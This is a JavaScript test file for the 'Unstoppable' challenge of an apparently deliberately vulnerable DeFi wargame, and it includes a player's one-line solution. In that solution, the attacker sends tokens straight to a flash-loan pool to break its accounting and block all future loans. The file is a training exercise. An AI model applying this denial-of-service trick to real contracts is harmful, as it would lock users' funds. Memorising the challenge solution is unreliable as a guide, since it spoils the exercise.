const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        // deploys ERC20 token, and flash loan contract
        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        // deployer initializes the pool
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        // give attacker(me) 100 tokens to start off with  
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            // ensures pool has 1000000 ether
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            // ensures attacker(me) has 100 tokens
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /*
        // set up receiver for attacker
        const attackerReciever = await ethers.getContractFactory('ReceiverUnstoppable', attacker);
        this.attackerContract = await ReceiverContractFactory.deploy(this.pool.address);
        */
        
        // send some tokens to pool
        await this.token.connect(attacker).transfer(this.pool.address, 10);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;

    });
});
